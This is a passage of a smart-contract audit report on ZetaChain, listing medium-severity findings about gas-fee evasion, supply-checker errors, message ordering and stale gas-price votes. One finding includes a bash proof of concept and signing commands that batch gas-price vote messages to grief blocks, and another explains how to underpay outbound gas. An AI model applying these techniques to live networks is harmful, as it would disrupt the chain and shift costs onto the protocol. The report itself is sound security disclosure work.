However, cctx's that transfer Zeta tokens, i.e., with the coin type `CoinType_Zeta`, do not have the gas limit overwritten, instead it is set to the value that was specified by the sender of the cctx. For example, by calling the [`ZetaConnectorEth.send`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L41) function. This gas limit can be arbitrarily set and will be picked up by the observers and [included in the `MsgVoteOnObservedInboundTx` message](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/utils.go#L168).

As a result, user's can set the gas limit to the lowest possible value, 1 (*0 is not possible* due to Uniswap's [`getAmountIn` preventing zero amounts](https://github.com/Uniswap/v2-periphery/blob/0335e8f7e1bd1e8d8329fd300aea2ef2f36dd19f/contracts/libraries/UniswapV2Library.sol#L54)) so that the[ calculated gas fee for the outbound transaction is almost zero](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/gas_payment.go#L288-L289).

Once observers process the outbound transaction, the gas limit (set by the user to 1) is [overwritten with the lower bound of 100k](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L375-L378) and broadcasted to the receiver chain.

Consequently, user's can avoid paying the adequate gas fees for outbound Zeta token transactions and the TSS address will have to pay the gas fees instead.

For completeness it should be mentioned that a protocol fee of currently [`2e18` Zeta tokens](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/types/keys.go#L27) is [charged](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/gas_payment.go#L296). This offsets the insufficient gas fees paid by the user to some extent, however, it defeats the purpose of the gas fees and misuses the protocol fee.

### Recommended mitigation steps

Consider enforcing the minimum gas limit of 100k already in the `PayGasInZetaAndUpdateCctx` function in [line 288](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/gas_payment.go#L288).


**[lumtis (Zetachain) confirmed via duplicate Issue #240](https://github.com/code-423n4/2023-11-zetachain-findings/issues/240#event-11388708550)**

***

## [[M-17] Zeta token supply checker incorrectly classifies in-transit cctxs as settled resulting in misleading checks](https://github.com/code-423n4/2023-11-zetachain-findings/issues/400)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/400)*

The Zeta token supply checker delivers false positives, suggesting that there is a Zeta token supply mismatch.

### Proof of Concept

The `GetPendingCCTXInTransit` function in the `ZetaSupplyChecker` is supposed to return all cctxs that are currently in transit, i.e., cctxs that are pending and soon to be sent to the receiving chains. These pending cctx's are then used to [determine the amount of in-transit Zeta tokens (`zetaInTransit`)](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zeta_supply_checker.go#L140), subsequently [used in the `ValidateZetaSupply` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zeta_supply_checker.go#L155) to check and validate the Zeta token supply.

Internally, the `GetPendingCCTXInTransit` function queries all pending cctxs for the `receivingChains` from the ZetaChain RPC in line `210`. Thereafter, the cctxs are filtered in lines `221-233` by removing all cctxs that have been added to the `OutTxTracker`.

```go
207: func (zs *ZetaSupplyChecker) GetPendingCCTXInTransit(receivingChains []common.Chain) []*types.CrossChainTx {
208: 	cctxInTransit := make([]*types.CrossChainTx, 0)
209: 	for _, chain := range receivingChains {
210: 		cctx, err := zs.zetaClient.GetAllPendingCctx(chain.ChainId)
211: 		if err != nil {
212: 			continue
213: 		}
214: 		nonceToCctxMap := make(map[uint64]*types.CrossChainTx)
215: 		for _, c := range cctx {
216: 			if c.GetInboundTxParams().CoinType == common.CoinType_Zeta {
217: 				nonceToCctxMap[c.GetCurrentOutTxParam().OutboundTxTssNonce] = c
218: 			}
219: 		}
220:
221: 		trackers, err := zs.zetaClient.GetAllOutTxTrackerByChain(chain, Ascending)
222: 		if err != nil {
223: 			continue
224: 		}
225: 		for _, tracker := range trackers {
226: 			zs.logger.Info().Msgf("tracker exists for nonce: %d , removing from supply checks", tracker.Nonce)
227: 			delete(nonceToCctxMap, tracker.Nonce)
228: 		}
229: 		for _, c := range nonceToCctxMap {
230: 			if c != nil {
231: 				cctxInTransit = append(cctxInTransit, c)
232: 			}
233: 		}
234: 	}
235: 	return cctxInTransit
236: }
```

The reasoning for this is that once a cctx has been broadcasted to the receiver chain by the observers, the [cctx is added to the `OutTxTracker`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L585). As a result, the cctx is no longer considered to be in transit, the Zeta token supply on the receiver chain is updated (via [minting](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L70) or [unlocking](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L60)) and the update Zeta token supply is either included in the [`ethLockedAmount`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zeta_supply_checker.go#L131) or [`externalChainTotalSupply`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zeta_supply_checker.go#L117).

However, the assumption that when a cctx is broadcasted to the receiver chain and included in the `OutTxTracker`, the cctx is no longer in transit is only partially correct. Once the transaction is broadcasted, it first stays in the EVM mempool until it is included in a block. Only then, the transaction is executed in the EVM, the state transition is applied and the Zeta token supply updated.

Consequently, the in-transit Zeta token is not correctly tracked, and the supply checker can not correctly validate the Zeta token supply.

### Recommended mitigation steps

I'm not entirely sure how to fix this issue and if it's even viable to do so. Rather, the supply checker should be allowed to work with a margin of error, i.e., the supply checker should be allowed to be off by a certain amount of Zeta tokens.

**[DadeKuma (Lookout) commented](https://github.com/code-423n4/2023-11-zetachain-findings/issues/400#issuecomment-1866269204):**
 > Pending transactions in mempool might break the max supply invariant.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/400#issuecomment-1876985719)**

***

## [[M-18] A single malicious observer can fill the block space with `MsgGasPriceVoter` messages without proper gas compensation resulting in griefing blocks](https://github.com/code-423n4/2023-11-zetachain-findings/issues/398)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/398)*

ZetaChain blocks can be griefed by a single observer, resulting in the block space being filled with `MsgGasPriceVoter` messages, preventing other transactions from being processed.

### Proof of Concept

Observers submit the gas prices of the external (connected) chains by sending the `MsgGasPriceVoter` message to ZetaChain. This message is handled in the [`GasPriceVoter`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_gas_price.go#L125-L187) function.

The median gas price is then set in the zEVM's system contract by calling the `SetGasPrice` function in line `174`.

```go
125: func (k msgServer) GasPriceVoter(goCtx context.Context, msg *types.MsgGasPriceVoter) (*types.MsgGasPriceVoterResponse, error) {
... 	// [...]
173:
174: 	gasUsed, err := k.fungibleKeeper.SetGasPrice(
175: 		ctx,
176: 		chainIDBigINT,
177: 		math.NewUint(gasPrice.Prices[gasPrice.MedianIndex]).BigInt(),
178: 	)
179: 	if err != nil {
180: 		return nil, err
181: 	}
182:
183: 	// reset the gas count
184: ❌ k.ResetGasMeterAndConsumeGas(ctx, gasUsed)
185:
186: 	return &types.MsgGasPriceVoterResponse{}, nil
187: }
```

As this is a call to the zEVM (Evmos) and gas for this EVM call is accounted differently than gas in Cosmos SDK, the gas meter is reset in line [`184`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_gas_price.go#L184) by calling the [`ResetGasMeterAndConsumeGas`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_gas_price.go#L208-L212) function to match the EVM's gas consumption, i.e., consume the amount of gas the EVM has consumed instead of the Cosmos SDK gas.

```go
206: // ResetGasMeterAndConsumeGas reset first the gas meter consumed value to zero and set it back to the new value
207: // 'gasUsed'
208: func (k *Keeper) ResetGasMeterAndConsumeGas(ctx sdk.Context, gasUsed uint64) {
209: 	// reset the gas count
210: 	ctx.GasMeter().RefundGas(ctx.GasMeter().GasConsumed(), "reset the gas count")
211: 	ctx.GasMeter().ConsumeGas(gasUsed, "apply evm transaction")
212: }
```

This is typically done by Evmos for `MsgEthereumTx` messages, as explained in the Evmos documentation - ["Matching EVM Gas consumption"](https://docs.evmos.org/protocol/concepts/gas-and-fees#matching-evm-gas-consumption).

In this instance, the `MsgGasPriceVoter` message (sent by observers), specifically, the consumed gas, does not necessarily have to match the EVM gas model.

However, contrary to Evmos, the transaction's gas meter is reset **on every** `MsgGasPriceVoter` message, ignoring the accumulated gas consumption for multiple messages within a Cosmos SDK transaction (Cosmos [allows multiple messages per transaction](https://tutorials.cosmos.network/tutorials/7-cosmjs/3-multi-msg.html#multiple-token-transfer-messages)).

Concretely, [Evmos uses the accumulated gas](https://github.com/evmos/evmos/blob/96857483806df9e7ab243b39c05e76e574c5af3a/x/evm/keeper/state_transition.go#L246-L252) used by multiple messages to ensure that the gas meter accounts for the gas consumed by all messages.

As a result, only the gas for the last `MsgGasPriceVoter` message is accounted for, and the gas for all previous messages is ignored, allowing the sender (observer) to send a high number of `MsgGasPriceVoter` messages and only paying the gas for a single message execution.

Consequently, a malicious observer can exploit this to grief ZetaChain blocks so that blocks are mostly filled with `MsgGasPriceVoter` messages (or any other messages that consume a lot of gas), preventing other transactions from being processed.

This represents a **privilege escalation** as single observes are not supposed to have such a significant impact on the ZetaChain's block space, and thus, medium severity was chosen.

> **Please note:** This submission demonstrates how the **whole** ZetaChain network (not only inbound/outbound cctxs) can be significantly impacted (and griefed) by a single observer. Contrary to the medium severity submission "Observer can halt outbound cctx's and steal funds", which only impacts outbound cctx's.

### PoC

This quick and dirty proof of concept should demonstrate that the transaction gas meter only consumes a single `MsgGasPriceVoter` message.

1.  Start a local ZetaChain environment with `make start-smoke-test` and wait until everything is started

2.  Access the `zetacore0` docker container with `docker exec -it zetacore0 sh`

3.  Determine the observer address with `zetacored keys show operator`. Pick the `address` value and replace the subsequent `OBSERVER_ADDRESS` placeholder with it.

4.  Copy and paste the following bash script into a file called `gas.sh`:

<details>

    ```
    #!/bin/bash

    # Number of times to repeat the message
    num_messages=$1

    # Address to be used
    address=$2

    # Start of the JSON file
    json_start='{
      "body": {
        "messages": ['

    # Message template
    message_template='{
            "@type": "/zetachain.zetacore.crosschain.MsgGasPriceVoter",
            "creator": "'$address'",
            "chain_id": "1337",
            "price": "10000000001",
            "block_number": "101",
            "supply": "100"
          }'

    # End of the JSON file
    json_end='
        ],
        "memo": "",
        "timeout_height": "0",
        "extension_options": [],
        "non_critical_extension_options": []
      },
      "auth_info": {
        "signer_infos": [],
        "fee": {
          "amount": [
            {
              "denom": "azeta",
              "amount": "51803"
            }
          ],
          "gas_limit": "518280",
          "payer": "",
          "granter": ""
        },
        "tip": null
      },
      "signatures": []
    }'

    # Combine all parts
    json=$json_start

    # Add the messages
    for ((i=1; i<=$num_messages; i++))
    do
      json+=$message_template

      if (( i != num_messages ))
      then
        json+=','
      fi
    done

    json+=$json_end

    echo "$json" > gas.json
    ```

</details>

5.  `chmod +x gas.sh` and run with `./gas.sh 100 OBSERVER_ADDRESS`. This will generate a transaction with 100 `MsgGasPriceVoter` messages and stores it in `gas.json`.

6.  Sign the transaction
    ```
    zetacored tx sign gas.json --from OBSERVER_ADDRESS --gas=auto --gas-prices=0.4azeta --gas-adjustment=20 --chain-id=athens_101-1 --keyring-backend=test -y --broadcast-mode=block > tx.signed.json
    ```

7.  Broadcast the transaction with `zetacored tx broadcast tx.signed.json`

8.  Query the transaction hash to determine the used gas. Replace `HASH` with the transaction hash from the previous step.
    ```
    zetacored q tx --type=hash HASH | grep "gas_used"
    ```

9.  Step 8 should print something like `gas_used: "28704"` (the actual value may vary). This is the total gas used by the transaction. However, this value should be much higher as the transaction contains 100 `MsgGasPriceVoter` messages. This indicates that the gas meter is reset on every `MsgGasPriceVoter` message (you can verify it by determining the gas usage from a single `MsgGasPriceVoter`)

### Recommended mitigation steps

Consider **not resetting** the gas meter for `MsgGasPriceVoter` messages.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/398#issuecomment-1966101134)**

***

## [[M-19] Inbound transactions submitted to the `InTxTracker` that contain multiple `ZetaSent` and `Deposited` events are not processed correctly by the observers resulting in a loss of funds](https://github.com/code-423n4/2023-11-zetachain-findings/issues/396)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/396)*

Observers miss out on voting on multiple `ZetaSent` and ERC-20 `Deposited` events that have been emitted in a single transaction, resulting in a loss of funds.

### Proof of Concept

Anyone can submit inbound transactions to ZetaChain's `InTxTracker` via the `MsgAddToInTxTracker` message in case the transaction was missed by the observers in the first place to ensure the transaction is processed.

The [`AddToInTxTracker` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_intx_tracker.go#L15-L55) handles the `MsgAddToInTxTracker` message and ensures that the submitted transaction is a valid inbound transaction by verifying the provided Merkle proof. Additionally, the transaction's `To` address must be the corresponding ZetaChain contract address (e.g., [connector address for the Zeta coin type](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/verify_proof.go#L75), or the [custody contract address for the ERC-20 coin type](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/verify_proof.go#L84)).

ZetaChain observers [continuously query this `InTxTracker` in the `ObserveTrackerSuggestions` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L113-L142).

If the submitted inbound transaction's coin type is `CoinType_Zeta`, the `CheckReceiptForCoinTypeZeta` function [iterates all logs contained in the transaction's receipt, as seen in lines 156-164](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L156-L164).

```go
144: func (ob *EVMChainClient) CheckReceiptForCoinTypeZeta(txHash string, vote bool) (string, error) {
145: connector, err := ob.GetConnectorContract()
...  // [...]
154:
155: var msg types.MsgVoteOnObservedInboundTx
156: for _, log := range receipt.Logs {
157: 	event, err := connector.ParseZetaSent(*log)
158: 	if err == nil && event != nil {
159: 		msg, err = ob.GetInboundVoteMsgForZetaSentEvent(event)
160: 		if err == nil {
161: ❌			break
162: 		}
163: 	}
164: }
...  // [...]
177: }
```

However, as soon as the first `ZetaSent` event is found and the corresponding `MsgVoteOnObservedInboundTx` message is successfully created, the `for` loop is exited in line `161` via the `break` statement.

Similarly, this also applies to the [`CheckReceiptForCoinTypeERC20` function in line `195`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/inbound_tracker.go#L195), that processes `Deposited` events emitted by the `ERC20Custody.deposit` function.

As a consequence, if the transaction contains multiple `ZetaSent` events, only the first event is processed and voted upon in ZetaChain, and the other events are ignored.

Those ignored `ZetaSent` events are *potentially* never processed and the corresponding Zeta tokens that have been [locked](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L32) or [burned](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L41) in the connector contract are lost.

The use of *"potentially"* is due to the fact that the inbound transaction was missed by the observers (for any reason) in the first place, and therefore, the affected user submitted the transaction via the `MsgAddToInTxTracker` message.

**Now the question is, how is it possible that multiple `ZetaSent` events are emitted when the transaction's `To` address is the connector contract address?**

This transaction could have been the result of a cross-chain message, and thus the [`ZetaConnectorEth.onReceive` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L52-L70) is invoked. This function optionally calls the `onZetaMessage` function of the provided `destinationAddress` contract in lines `64-66`.

```solidity
52: function onReceive(
53:     bytes calldata zetaTxSenderAddress,
54:     uint256 sourceChainId,
55:     address destinationAddress,
56:     uint256 zetaValue,
57:     bytes calldata message,
58:     bytes32 internalSendHash
59: ) external override onlyTssAddress {
60:     bool success = IERC20(zetaToken).transfer(destinationAddress, zetaValue);
61:     if (!success) revert ZetaTransferError();
62:
63:     if (message.length > 0) {
64:         ZetaReceiver(destinationAddress).onZetaMessage(
65:             ZetaInterfaces.ZetaMessage(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message)
66:         );
67:     }
68:
69:     emit ZetaReceived(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message, internalSendHash);
70: }
```

Within this `onZetaMessage` function, the destination contract can repeatedly call the [`ZetaConnectorEth.send` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L31-L45) to send cross-chain messages.

Et voilà, multiple `ZetaSent` events are emitted.

Similarly, this also applies for repeatedly calling the [`ERC20Custody.deposit`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L165-L185) function to deposit ERC-20 tokens.

### Recommended mitigation steps

Consider removing the `break` statement in lines `161` and `195`, and instead, process and vote on all `ZetaSent` and `Deposited` events.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/396#issuecomment-1877426675)**

***

## [[M-20] Lack of message ordering may lead to failed transactions](https://github.com/code-423n4/2023-11-zetachain-findings/issues/395)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/395)*

Cross-chain messages might be processed out-of-order, leading to failed transactions and dApps that are not working as expected.

### Proof of Concept

Cross-chain messages can be sent between external chains by using the [`ZetaConnectorEth.send` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L31-L45). This function emits the `ZetaSent` event that is subsequently picked up by the ZetaChain observers and voted upon.

```solidity
31: function send(ZetaInterfaces.SendInput calldata input) external override whenNotPaused {
32:     bool success = IERC20(zetaToken).transferFrom(msg.sender, address(this), input.zetaValueAndGas);
33:     if (!success) revert ZetaTransferError();
34:
35:     emit ZetaSent(
36:         tx.origin,
37:         msg.sender,
38:         input.destinationChainId,
39:         input.destinationAddress,
40:         input.zetaValueAndGas,
41:         input.destinationGasLimit,
42:         input.message,
43:         input.zetaParams
44:     );
45: }
```

Such a cross-chain transaction is considered valid (finalized), [once a quorum of observers has voted on the transaction and verified the legitimacy of the transaction](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_inbound_tx.go#L100). This process naturally takes a certain amount of time, as the observers wait for the including block (on the external chain) to be confirmed by a reasonable amount of subsequent blocks. Additionally, observers are not 100% synchronized, meaning that some observers might have seen the including block earlier than others.

As a result, cross-chain transactions, or inbound cctxs in general, are not guaranteed to be finalized in the order they were sent from the external chain.

This can lead to a situation where a contract on an external chain that sends two consecutive cross-chain messages and expects the second message to be processed after the first message, is not guaranteed to be processed in the correct order.

For example, consider the simplified example of a staking dApp which sends multiple consecutive cross-chain messages in the same block or transaction *(please ignore the reasoning why a user would stake and immediately unstakes, this should just demonstrate the dependency on the order of the messages)*:

1.  `stake`
2.  `unstake`

Those two messages have to be in order. If message 2 (`unstake`) is executed before message 1 (`stake`), the transaction reverts on the destination chain as there is no stake to unstake.

Even if the dApp would incorporate a nonce in the cross-chain message, the receiving contract on the destination chain would reject the out-of-order message as the nonce is not the next expected nonce and revert the transaction.

### Recommended mitigation steps

Consider adding the option to enforce message ordering per sender and source chain, similar to [LayerZero's message ordering](https://layerzero.gitbook.io/docs/faq/messaging-properties#message-ordering) feature.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/395#issuecomment-1876981082)**

***

## [[M-21] Inability to reliably verify inbound transactions may result in missed inbound transactions](https://github.com/code-423n4/2023-11-zetachain-findings/issues/394)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/394), also found by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/328)*

Certain inbound transactions can not be added to the inbound transaction tracker due to the inability to verify their legitimacy, potentially resulting in missed inbound transactions.

### Proof of Concept

Anyone can submit inbound transactions to ZetaChain's `InTxTracker` via the `MsgAddToInTxTracker` message in case the transaction was missed by the observers in the first place, to ensure the transaction is processed.

The [`AddToInTxTracker` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/msg_server_add_to_intx_tracker.go#L15-L55) handles the `MsgAddToInTxTracker` message and ensures that the submitted transaction is a valid inbound transaction by verifying the provided block inclusion proof in line `28`.

```go
15: func (k msgServer) AddToInTxTracker(goCtx context.Context, msg *types.MsgAddToInTxTracker) (*types.MsgAddToInTxTrackerResponse, error) {
..    // [...]
26: 	isProven := false
27: 	if !(isAdmin || isObserver) && msg.Proof != nil {
28: 		txBytes, err := k.VerifyProof(ctx, msg.Proof, msg.ChainId, msg.BlockHash, msg.TxIndex)
29: 		if err != nil {
30: 			return nil, types.ErrProofVerificationFail.Wrapf(err.Error())
31: 		}
32:
33: 		if common.IsEVMChain(msg.ChainId) {
34: 			err = k.VerifyEVMInTxBody(ctx, msg, txBytes)
35: 			if err != nil {
36: 				return nil, types.ErrTxBodyVerificationFail.Wrapf(err.Error())
37: 			}
38: 		} else {
39: 			return nil, types.ErrTxBodyVerificationFail.Wrapf(fmt.Sprintf("cannot verify inTx body for chain %d", msg.ChainId))
40: 		}
41: 		isProven = true
42: 	}
..    // [...]
```

After verifying if the transaction is included in the block, the transaction is checked if it is a valid inbound transaction by calling the `VerifyEVMInTxBody` function in line `34`.

```go
057: func (k Keeper) VerifyEVMInTxBody(ctx sdk.Context, msg *types.MsgAddToInTxTracker, txBytes []byte) error {
058: 	var txx ethtypes.Transaction
059: 	err := txx.UnmarshalBinary(txBytes)
060: 	if err != nil {
061: 		return err
062: 	}
063: 	if txx.Hash().Hex() != msg.TxHash {
064: 		return fmt.Errorf("want tx hash %s, got %s", txx.Hash().Hex(), msg.TxHash)
065: 	}
066: 	if txx.ChainId().Cmp(big.NewInt(msg.ChainId)) != 0 {
067: 		return fmt.Errorf("want evm chain id %d, got %d", txx.ChainId(), msg.ChainId)
068: 	}
069: 	switch msg.CoinType {
070: 	case common.CoinType_Zeta:
071: 		coreParams, found := k.zetaObserverKeeper.GetCoreParamsByChainID(ctx, msg.ChainId)
072: 		if !found {
073: 			return types.ErrUnsupportedChain.Wrapf("core params not found for chain %d", msg.ChainId)
074: 		}
075: 		if txx.To().Hex() != coreParams.ConnectorContractAddress {
076: 			return fmt.Errorf("receiver is not connector contract for coin type %s", msg.CoinType)
077: 		}
078: 		return nil
079: 	case common.CoinType_ERC20:
080: 		coreParams, found := k.zetaObserverKeeper.GetCoreParamsByChainID(ctx, msg.ChainId)
081: 		if !found {
082: 			return types.ErrUnsupportedChain.Wrapf("core params not found for chain %d", msg.ChainId)
083: 		}
084: 		if txx.To().Hex() != coreParams.Erc20CustodyContractAddress {
085: 			return fmt.Errorf("receiver is not erc20Custory contract for coin type %s", msg.CoinType)
086: 		}
087: 		return nil
088: 	case common.CoinType_Gas:
089: 		tss, err := k.GetTssAddress(ctx, &types.QueryGetTssAddressRequest{})
090: 		if err != nil {
091: 			return err
092: 		}
093: 		tssAddr := eth.HexToAddress(tss.Eth)
094: 		if tssAddr == (eth.Address{}) {
095: 			return fmt.Errorf("tss address not found")
096: 		}
097: 		if txx.To().Hex() != tssAddr.Hex() {
098: 			return fmt.Errorf("receiver is not tssAddress contract for coin type %s", msg.CoinType)
099: 		}
100: 		return nil
101: 	default:
102: 		return fmt.Errorf("coin type %s not supported", msg.CoinType)
103: 	}
104: }
```

The [`VerifyEVMInTxBody` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/verify_proof.go#L57-L104) checks in lines `75` and `84` if the transaction's `To` address is the expected address for the given coin type. For example, if the coin type is `common.CoinType_ERC20`, the `To` address must match the address of the `ERC20Custody` contract. Otherwise, if the `To` address is not the expected address, the transaction is considered invalid and not added to the inbound transaction tracker.

However, this check is not sufficient to reliably determine if the transaction is a valid inbound tx.

Specifically, if the [`ERC20Custody.deposit` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L165-L185) was called from another contract, thus the transaction's `To` address is not the `ERC20Custody` contract address, the transaction can not be added to the tracker, even though it is a valid inbound transaction. Potentially resulting in a missed inbound transaction.

Similarly, the `common.CoinType_Zeta` coin type is also affected.

For completeness, I'd like to point out that for the `common.CoinType_Gas` coin type, if a contract sends native gas tokens to the TSS address, it is not possible to determine if the transaction is a valid inbound transaction.

### Recommended mitigation steps

Consider also allowing to provide the logged event (log) and the accompanying proof of the event inclusion by [verifying the receipt merkle trie proof](https://medium.com/coinmonks/ethereum-data-transaction-receipt-trie-and-logs-simplified-30e3ae8dc3cf).

**[lumtis (ZetaChain) acknowledged](https://github.com/code-423n4/2023-11-zetachain-findings/issues/394#issuecomment-1876978003)**

***

## [[M-22] Lagging median gas price when the set of observers changes](https://github.com/code-423n4/2023-11-zetachain-findings/issues/393)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/393), also found by [deliriusz](https://github.com/code-423n4/2023-11-zetachain-findings/issues/499) and [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/185)*

The median gas price used within ZetaChain may be inaccurate and lagging, causing outbound transactions to be underpriced and pending in the mempool and gas fees to be underpaid by users.

### Proof of Concept

ZetaChain observers, i.e., zetaclients, watch the gas prices of the external chains and submit the current prices to ZetaChain by broadcasting the `MsgGasPriceVoter` message. This message is processed by the `GasPriceVoter` function in [node/x/crosschain/keeper/keeper_gas_price.go#L125-L187](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_gas_price.go#L125-L187).

Each observer's gas price vote is stored in the `GasPrice` struct in the `Prices` array and the gas price is determined by [using the median of the stored values in line `167`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_gas_price.go#L167).

The number of ZetaChain observers can increase or decrease over time, e.g., due to validator nodes exiting the network, slashing, or observers being removed/added by the admin.

This leads to an issue as there will be stale gas price "vote" entries in the `GasPrice.Prices` array that will affect the median calculation. As a result, the calculated gas price may be inaccurate and lag behind the actual gas price.

**Consider the following example:**

Given 9 observers and their gas price votes:

| Observer Index | 0  | 1 | 2 | 3  | 4  | 5  | 6  | 7  | 8  |
| -------------- | -- | - | - | -- | -- | -- | -- | -- | -- |
| Gas Price      | 10 | 5 | 5 | 20 | 15 | 10 | 10 | 40 | 20 |

Sorting the gas prices in ascending order:

| Observer Index | 1 | 2 | 5  | 6  | 0  | 4  | 3  | 8  | 7  |
| -------------- | - | - | -- | -- | -- | -- | -- | -- | -- |
| Gas Price      | 5 | 5 | 10 | 10 | 10 | 15 | 20 | 20 | 40 |

The median gas price is: `10` (from the observer with index 0)

Now, let's assume that 4 of the observers (observers 0, 1, 2, 3 - marked with **&ast;**) are inactive and do not submit gas price votes anymore. The remaining observers continue to submit gas prices (gas price spiked)

| Observer Index | 0*  | 1* | 2* | 3*  | 4  | 5  | 6  | 7  | 8  |
| -------------- | --- | -- | -- | --- | -- | -- | -- | -- | -- |
| Gas Price      | 10* | 5* | 5* | 20* | 40 | 60 | 70 | 70 | 70 |

Sorting the gas prices in ascending order:

| Observer Index | 1* | 2* | 0*  | 3*  | 4  | 5  | 6  | 7  | 8  |
| -------------- | -- | -- | --- | --- | -- | -- | -- | -- | -- |
| Gas Price      | 5* | 5* | 10* | 20* | 40 | 60 | 70 | 70 | 70 |

The median gas price is: `40` (from the observer with index 4)

As observers 0, 1, 2, and 3 are inactive, their stale gas price votes are still considered in the median calculation, leading to a lagging gas price. If we would ignore the inactive observers, the median gas price would be `70`.

This can be mitigated by using the [block height of the submitted gas price vote, stored in `GasPrice.BlockNums`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_gas_price.go#L155) and ignoring stale votes.

### Recommended mitigation steps

